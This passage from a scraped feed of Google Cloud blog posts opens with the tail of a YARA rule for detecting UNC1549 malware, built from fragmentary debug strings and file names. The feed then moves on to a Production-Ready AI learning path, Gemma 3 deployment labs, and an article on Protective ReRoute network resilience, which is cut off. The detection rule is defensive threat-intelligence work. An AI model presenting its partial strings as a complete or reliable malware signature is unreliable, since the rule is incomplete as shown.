%u\" ascii fullword\n\t\t$ = \"[-] Th ge. \" ascii fullword\n\t\t$ = \"[+] O s!\" ascii fullword\n\t\t$ = \"[-] O C: %i\" ascii fullword\n\t\t$ = \"[-] O E: %i\" ascii fullword\n\t\t$ = \"[+] Op cess!\" ascii fullword\n\t\t$ = \"[-] Op Code: %i\" ascii fullword\n\t\t$ = \"[-] O Error: %i\" ascii fullword\n\t\t$ = \"[+] Im su!\" ascii fullword\n\t\t$ = \"[+] R\" ascii fullword\n\t\t$ = \"[-] Impe Code: %i\" ascii fullword\n\t\t$ = \"[-] Imo: %i\" ascii fullword\n\t\t$ = \"[+] Du success!\" ascii fullword\n\t\t$ = \"[-] Du Code: %i\" ascii fullword\n\t\t$ = \"[-] Du Error: %i\" ascii fullword\n\t\t$ = \"[+] Dec Suc.\" ascii fullword\n\t\t$ = \"%02X\" ascii fullword\n\t\t$ = \"Decryption failed\" ascii fullword\n\t\t$ = \"config.txt\"\n\t\t$ = \"crash.log\"\n\t\t$ = \"[+] e wt!\" ascii fullword\n\t\t$ = \"[+] p %d!\" ascii fullword\n\t\t$ = \"[+] e!\" ascii fullword\n\tcondition:\n\t\tpe.is_pe and 15 of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Google Security Operations Detections</span></h3>\n<p><span style=\"vertical-align: baseline;\">Google SecOps customers receive robust detection for UNC1549 TTPs through curated threat intelligence from Mandiant and Google Threat Intelligence. This frontline intelligence is operationalized within the platform as custom detection signatures and advanced YARA-L rules.</span></p></div>",
        "published_date": "2025-11-17 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/production-ready-ai-with-google-cloud-learning-path/",
        "title": "Production-Ready AI with Google Cloud Learning Path",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Production-Ready_AI_Launch_hero_image_3_1.max-600x600.png",
        "author": "Mollie Pettit",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We're excited to launch the </span><strong style=\"vertical-align: baseline;\">Production-Ready AI with Google Cloud Learning Path</strong><span style=\"vertical-align: baseline;\">, a free series designed to take your AI projects from prototype to production.</span></p>\n<p><span style=\"vertical-align: baseline;\">This page is the central hub for the curriculum. We'll be updating it weekly with new modules from now through mid-December.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Why We Built This: Bridging the Prototype-to-Production Gap</span></h2>\n<p><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Generative AI</span></a><span style=\"vertical-align: baseline;\"> makes it easy to build an impressive prototype. But moving from that proof-of-concept to a secure, scalable, and observable production system is where many projects stall. This is the </span><strong style=\"vertical-align: baseline;\">prototype-to-production gap</strong><span style=\"vertical-align: baseline;\">. It's the challenge of answering hard questions about </span><a href=\"https://cloud.google.com/security/securing-ai?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">security</span></a><span style=\"vertical-align: baseline;\">, infrastructure, and </span><a href=\"https://cloud.google.com/docs/observability?utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">monitoring</span></a><span style=\"vertical-align: baseline;\"> for a system that now includes a probabilistic model.</span></p>\n<p><span style=\"vertical-align: baseline;\">It’s a journey we’ve been on with our own teams at </span><a href=\"https://cloud.google.com/free?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=na-US-all-en-dr-bkws-all-all-trial-e-dr-1710134&amp;utm_content=text-ad-none-any-DEV_c-CRE_772251307851-ADGP_Hybrid+%7C+BKWS+-+EXA+%7C+Txt-Generic+Cloud-Cloud+Generic-Cloud+Generic-KWID_6458750523-kwd-6458750523&amp;utm_term=KW_google%20cloud-ST_google+cloud&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=22970352459&amp;gclid=EAIaIQobChMIyZ2ylJfKkAMVMyytBh3vMRRMEAAYASAAEgK3AvD_BwE\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud</span></a><span style=\"vertical-align: baseline;\">. To solve for this ongoing challenge, we built a comprehensive internal playbook focused on production-grade best practices. After seeing the playbook's success, we knew we had to share it.</span></p>\n<p><span style=\"vertical-align: baseline;\">This learning path </span><span style=\"font-style: italic; vertical-align: baseline;\">is</span><span style=\"vertical-align: baseline;\"> that playbook, adapted for all developers. The path's curriculum combines the power of </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini models</span></a><span style=\"vertical-align: baseline;\"> with production-grade tools like </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/kubernetes-engine?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://cloud.google.com/run?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">We're excited to share this curriculum with the developer community. Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning! </span></p>\n<h2 id=\"curriculum\"><span style=\"vertical-align: baseline;\">The Curriculum</span></h2>\n<h3><span style=\"vertical-align: baseline;\">Module 1: Developing Apps that use LLMs</span></h3>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Start with the fundamentals of building applications and interacting with models using the </span><a href=\"https://docs.cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk-ref?utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\">.</span></span></p>\n<p><strong><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">Summary</span></span></strong><span style=\"vertical-align: baseline;\">: </span><a href=\"https://cloud.google.com/blog/topics/developers-practitioners/your-first-ai-application-is-easier-than-you-think?e=48754805&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Your First AI Application is Easier Than You Think</span></a></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to labs!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fb88c4c9250&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Module 2: Deploying Open Models</span></h3>\n<p><span style=\"vertical-align: baseline;\">Learn to serve and scale open source models efficiently by deploying them on production-grade platforms like </span><a href=\"https://cloud.google.com/kubernetes-engine?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/run?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://docs.cloud.google.com/vertex-ai/docs/general/deployment?utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI endpoints</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\"><strong>Summary</strong>: <a href=\"https://cloud.google.com/blog/topics/developers-practitioners/hands-on-with-gemma-3-on-google-cloud\">Hands-on with Gemma 3 on Google Cloud</a></span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to labs!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fb88c4c91f0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Module 3: Developing Agents</span></h3>\n<p><span style=\"vertical-align: baseline;\">Learn to build AI agents that can reason, plan, and use tools to accomplish complex tasks with the </span><a href=\"https://github.com/google/adk-python\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\"><strong>Summary</strong>: </span><a href=\"https://cloud.google.com/blog/topics/developers-practitioners/build-your-first-adk-agent-workforce?utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Build Your First ADK Agent Workforce</span></a></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Go to labs!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fb88c4c9190&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Module 4: Securing AI Applications</span></h3>\n<p><span style=\"vertical-align: baseline;\">Master the essential practices for </span><a href=\"https://cloud.google.com/security/securing-ai?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452059547&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">securing</span></a><span style=\"vertical-align: baseline;\"> your infrastructure, data, and AI-powered endpoints in a production environment.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 5: Deploying Agents</span></h3>\n<p><span style=\"vertical-align: baseline;\">Take your agents to production by deploying them on scalable, managed platforms like Google Kubernetes Engine (GKE) and Cloud Run. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 6: Introduction to Databases</span></h3>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Content coming soon!</span></li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 7: Evaluation</span></h3>\n<p><span style=\"vertical-align: baseline;\">Discover how to rigorously evaluate the performance of your LLM outputs, agents, and RAG systems to ensure quality and reliability.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 8: Advanced Agent Capabilities</span></h3>\n<p><span style=\"vertical-align: baseline;\">Learn how to enhance your agent's capabilities with agentic RAG, Model Context Protocol (MCP) tools, and Agent to Agent (A2A) protocol.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 9: Advanced RAG Methods</span></h3>\n<p><span style=\"vertical-align: baseline;\">Optimize your RAG systems by connecting to databases and using advanced techniques like sophisticated chunking, re-ranking, and query transformations.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Module 10: Fine-Tuning</span></h3>\n<p><span style=\"vertical-align: baseline;\">Go beyond prompting and learn how to fine-tune both open and proprietary models to improve performance on specific tasks.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Content coming soon!</span></p>\n</li>\n</ul>\n<hr />\n<p><span style=\"vertical-align: baseline;\">We're committed to making this a living, evolving resource and will be adding to it over time.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Do you feel something is missing? </strong><a href=\"https://docs.google.com/forms/d/e/1FAIpQLSd2doeNpKTDFWKjPE5xJDi232TBZF-RaA3gcxfHY4QGEma1sg/viewform?usp=dialog\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Tell us here!</strong></a><strong style=\"vertical-align: baseline;\"> </strong></p></div>",
        "published_date": "2025-11-17 10:12:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/hands-on-with-gemma-3-on-google-cloud/",
        "title": "Hands-on with Gemma 3 on Google Cloud",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/gemma_3_hero.max-600x600.png",
        "author": "Olivier Bourgeois",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The landscape of generative AI is shifting. While proprietary APIs are powerful, there is a growing demand for </span><strong style=\"vertical-align: baseline;\">open models</strong><span style=\"vertical-align: baseline;\">—models where the architecture and weights are publicly available. This shift puts control back in the hands of developers, offering transparency, data privacy, and the ability to fine-tune for specific use cases.</span></p>\n<p><span style=\"vertical-align: baseline;\">To help you navigate this landscape, we are releasing </span><strong style=\"vertical-align: baseline;\">two new hands-on labs</strong><span style=\"vertical-align: baseline;\"> featuring </span><a href=\"https://ai.google.dev/gemma?utm_campaign=CDR_0x5723eddc_default_b459438884&amp;utm_medium=external&amp;utm_source=lab\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Gemma 3</strong></a><span style=\"vertical-align: baseline;\">, Google’s latest family of lightweight, state-of-the-art open models.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Why Gemma?</span></h2>\n<p><span style=\"vertical-align: baseline;\">Built from the same research and technology as Gemini, Gemma models are designed for responsible AI development. Gemma 3 is particularly exciting because it offers multimodal capabilities (text and image) and fits efficiently on smaller hardware footprints while delivering massive performance.</span></p>\n<p><span style=\"vertical-align: baseline;\">But running a model on your laptop is very different from running it in production. You need scale, reliability, and hardware acceleration (GPUs). The question is: </span><strong style=\"vertical-align: baseline;\">Where should you deploy?</strong></p>\n<p><span style=\"vertical-align: baseline;\">We have prepared two different paths for you, depending on your infrastructure needs: </span><a href=\"https://docs.cloud.google.com/run/docs?utm_campaign=CDR_0x5723eddc_default_b459438884&amp;utm_medium=external&amp;utm_source=lab\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</strong></a><span style=\"vertical-align: baseline;\"> or </span><a href=\"https://cloud.google.com/kubernetes-engine/docs?utm_campaign=CDR_0x5723eddc_default_b459438884&amp;utm_medium=external&amp;utm_source=lab\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</strong></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Path 1: The Serverless Approach (Cloud Run)</span></h2>\n<p><strong style=\"vertical-align: baseline;\">Best for:</strong><span style=\"vertical-align: baseline;\"> Developers who want an API up and running instantly without managing infrastructure, scaling to zero when not in use.</span></p>\n<p><span style=\"vertical-align: baseline;\">If your priority is simplicity and cost-efficiency for stateless workloads, Cloud Run is your answer. It abstracts away the server management entirely. With the recent addition of GPU support on Cloud Run, you can now serve modern LLMs without provisioning a cluster.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Start the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fb88c1cc790&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Path 2: The Platform Approach (GKE)</span></h2>\n<p><strong style=\"vertical-align: baseline;\">Best for:</strong><span style=\"vertical-align: baseline;\"> Engineering teams building complex AI platforms, requiring high throughput, custom orchestration, or integration with a broader microservices ecosystem.</span></p>\n<p><span style=\"vertical-align: baseline;\">When your application graduates from a prototype to a high-traffic production system, you need the control of Kubernetes. GKE Autopilot gives you that power while still handling the heavy lifting of node management. This path creates a seamless journey from local testing to cloud production.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Start the lab!&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fb88c1cc7f0&gt;), (&#x27;btn_text&#x27;, &#x27;&#x27;), (&#x27;href&#x27;, &#x27;&#x27;), (&#x27;image&#x27;, None)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Which Path Will You Choose?</span></h2>\n<p><span style=\"vertical-align: baseline;\">Whether you are looking for the serverless simplicity of Cloud Run or the robust orchestration of GKE, Google Cloud provides the tools to take Gemma 3 from a concept to a deployed application.</span></p>\n<p><span style=\"vertical-align: baseline;\">Dive into the labs today and start building:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://codelabs.developers.google.com/devsite/codelabs/serve-gemma3-with-vllm-on-cloud-run#0?utm_campaign=CDR_0x5723eddc_default_b459438884&amp;utm_medium=external&amp;utm_source=lab\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Serving Gemma 3 with vLLM on Cloud Run</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/5-deploying-agents/deploying-open-models-gke#0?utm_campaign=CDR_0x5723eddc_default_b459438884&amp;utm_medium=external&amp;utm_source=lab\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Deploying Open Models on GKE</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning!</span></p>\n<p><span style=\"vertical-align: baseline;\">These labs are part of the </span><strong style=\"vertical-align: baseline;\">Open Models</strong><span style=\"vertical-align: baseline;\"> module in our official </span><a href=\"https://cloud.google.com/blog/topics/developers-practitioners/production-ready-ai-with-google-cloud-learning-path\"><span style=\"vertical-align: baseline;\">Production-Ready AI with Google Cloud</span></a><span style=\"vertical-align: baseline;\"> program. Explore the full curriculum for more content that will help you bridge the gap from a promising prototype to a production-grade AI application.</span></p></div>",
        "published_date": "2025-11-17 10:06:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/networking/how-protective-reroute-improves-network-resilience/",
        "title": "Google Cloud Networking under the hood: How Protective ReRoute increases resilience",
        "thumbnail": null,
        "author": "Yaogong Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Cloud infrastructure reliability is foundational, yet even the most sophisticated global networks can suffer from a critical issue: </span><strong style=\"vertical-align: baseline;\">slow or failed recovery from routing outages.</strong><span style=\"vertical-align: baseline;\"> In massive, planetary-scale networks like Google's, router failures or complex, hidden conditions can prevent traditional routing protocols from restoring service quickly, or sometimes at all. These brief but costly outages — what we call </span><strong style=\"vertical-align: baseline;\">slow convergence</strong><span style=\"vertical-align: baseline;\"> or </span><strong style=\"vertical-align: baseline;\">convergence failure </strong><span style=\"vertical-align: baseline;\">— critically disrupt real-time applications with low tolerance to packet loss and, most acutely, today's massive, sensitive AI/ML training jobs, where a brief network hiccup can waste millions of dollars in compute time. </span></p>\n<p><span style=\"vertical-align: baseline;\">To solve this problem, we pioneered </span><strong style=\"vertical-align: baseline;\">Protective ReRoute (PRR)</strong><span style=\"vertical-align: baseline;\">, a radical shift that moves the responsibility for rapid failure recovery from the centralized network core to the distributed endpoints themselves. Since putting it into production over five years ago, this host-based mechanism has dramatically increased Google’s network's resilience, proving effective in recovering from up to </span><strong style=\"vertical-align: baseline;\">84%</strong><span style=\"vertical-align: baseline;\"><sup>1</sup> of inter-data-center outages that would have been caused by slow convergence events. Google Cloud customers with workloads that are sensitive to packet loss can also enable it in their environments — read on to learn more.   </span></p>\n<h3><strong style=\"vertical-align: baseline;\">The limits of in-network recovery</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Traditional routing protocols are essential for network operation, but they are often not fast enough to meet the demands of modern, real-time workloads. When a router or link fails, the network must recalculate all affected routes, which is known as </span><strong style=\"vertical-align: baseline;\">reconvergence</strong><span style=\"vertical-align: baseline;\">. In a network the size of Google's, this process can be complicated by the scale of the topology, leading to delays that range from many seconds to minutes. For distributed AI training jobs with their wide, fan-out communication patterns, even a few seconds of packet loss can lead to application failure and costly restarts. The problem is a matter of scale: as the network grows, the likelihood of these complex failure scenarios increases.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Protective ReRoute: A host-based solution</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Protective ReRoute is a simple, effective concept: </span><strong style=\"vertical-align: baseline;\">empower the communicating endpoints (the hosts) to detect a failure and intelligently re-steer traffic to a healthy, parallel path.</strong><span style=\"vertical-align: baseline;\"> Instead of waiting for a global network update, PRR capitalizes on the rich path diversity built into our network. The host detects packet loss or high latency on its current path, and then immediately initiates a path change by modifying carefully chosen packet header fields, which tells the network to use an alternate, pre-existing path.</span></p>\n<p><span style=\"vertical-align: baseline;\">This architecture represents a fundamental shift in network reliability thinking. Traditional networks rely on a combination of parallel and </span><strong style=\"vertical-align: baseline;\">series reliability</strong><span style=\"vertical-align: baseline;\">. Serialization of components tends to reduce the reliability of a system; in a large-diameter network with multiple forwarding stages, reliability degrades as the diameter increases. In other words, every forwarding stage affects the whole system. Even if a network stage is designed with parallel reliability, it creates a serial impact on the overall network while the parallel stage reconverges. By adding PRR at the edges, we treat the network as a </span><strong style=\"vertical-align: baseline;\">highly parallel system of paths that appear as a single stage</strong><span style=\"vertical-align: baseline;\">, where the overall reliability increases as the number of available paths grows exponentially, effectively circumventing the serialization effects of slow network convergence in a large-diameter network. The following diagram contrasts the system reliability model for a PRR-enabled network with that of a traditional network. Traditional network reliability is in inverse proportion to the number of forwarding stages; with PRR the reliability of the same network is in direct proportion to the number of composite paths, which is exponentially proportional to the network diameter.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1-Protective_ReRoute\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1-Protective_ReRoute.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">How Protective ReRoute works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The PRR mechanism has three core functional components:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">End-to-end failure detection:</strong><span style=\"vertical-align: baseline;\"> Communicating hosts continuously monitor path health. On Linux systems, the standard mechanism uses </span><strong style=\"vertical-align: baseline;\">TCP retransmission timeout (RTO)</strong><span style=\"vertical-align: baseline;\"> to signal a potential failure. The time to detect a failure is generally a single-digit multiple of the network's round-trip time (RTT). There are also other methods for end-to-end failure detection that have varying speed and cost.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Packet-header modification at the host:</strong><span style=\"vertical-align: baseline;\"> Once a failure is detected, the transmitting host modifies a packet-header field to influence the forwarding path. To achieve this, Google pioneered and contributed the mechanism that modifies the </span><strong style=\"vertical-align: baseline;\">IPv6 flow-label</strong><span style=\"vertical-align: baseline;\"> in the Linux kernel (version 4.20+). Crucially, the Google software-defined network (SDN) layer provides protection for </span><strong style=\"vertical-align: baseline;\">IPv4 traffic and non-Linux hosts</strong><span style=\"vertical-align: baseline;\"> as well by performing the detection and repathing on the outer headers of the network overlay.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">PRR-aware forwarding:</strong><span style=\"vertical-align: baseline;\"> Routers and switches in the multipath network respect this header modification and forward the packet onto a different, available path that bypasses the failed component.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Proof of impact</strong></h3>\n<p><span style=\"vertical-align: baseline;\">PRR is not theoretical; it is a continuously deployed, 24x7 system that protects production traffic worldwide. Its impact is compelling: PRR has been shown to reduce network downtime caused by slow convergence and convergence failures by up to the above-mentioned </span><strong style=\"vertical-align: baseline;\">84%</strong><span style=\"vertical-align: baseline;\">. This means that up to 8 out of every 10 network outages that would have been caused by a router failure or slow network-level recovery are now avoided by the host. Furthermore, host-initiated recovery is extremely fast, often resolving the problem in a single-digit multiple of the RTT, which is vastly faster than traditional network reconvergence times.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Key use cases for ultra-reliable networking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The need for PRR is growing, driven by modern application requirements:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">AI/ML training and inference:</strong><span style=\"vertical-align: baseline;\"> Large-scale workloads, particularly those </span><strong style=\"vertical-align: baseline;\">distributed across many accelerators</strong><span style=\"vertical-align: baseline;\"> (GPUs/TPUs), are uniquely sensitive to network reliability. PRR provides the ultra-reliable data distribution necessary to keep these high-value compute jobs running without disruption.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data integrity and storage:</strong><span style=\"vertical-align: baseline;\"> Significant numbers of dropped packets can result in </span><strong style=\"vertical-align: baseline;\">data corruption</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">data loss</strong><span style=\"vertical-align: baseline;\">, not just reduced throughput. By reducing the outage window, PRR improves application performance and helps guarantee data integrity.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Real-time applications:</strong><span style=\"vertical-align: baseline;\"> Applications like gaming and services like video conferencing and voice calls are intolerant of even brief connectivity outages. PRR reduces the recovery time for network failures to meet these strict real-time requirements.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Frequent short-lived connections:</strong><span style=\"vertical-align: baseline;\"> Applications that rely on a large number of very frequent short-lived connections can fail when the network is unavailable for even a short time. By reducing the expected outage window, PRR helps these applications reliably complete their required connections.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Activating Protective ReRoute for your applications</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The architectural shift to host-based reliability is an accessible technology for Google Cloud customers. The core mechanism is open and part of the mainline Linux kernel (version 4.20 and later).</span></p>\n<p><span style=\"vertical-align: baseline;\">You can benefit from PRR in two primary ways:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hypervisor mode:</strong><span style=\"vertical-align: baseline;\"> PRR automatically protects traffic running across Google data centers without requiring any guest OS changes. Hypervisor mode provides recovery in the single digit seconds for traffic of moderate fanout in specific areas of the network.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Guest mode:</strong><span style=\"vertical-align: baseline;\"> For critical, performance-sensitive applications with high fan-out and in any segment of the network, you can </span><strong style=\"vertical-align: baseline;\">opt into guest-mode PRR</strong><span style=\"vertical-align: baseline;\">, which</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">enables the fastest possible recovery time and greatest control. This is the optimal setting for demanding mission-critical applications, AI/ML jobs, and other latency-sensitive services.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To activate guest-mode 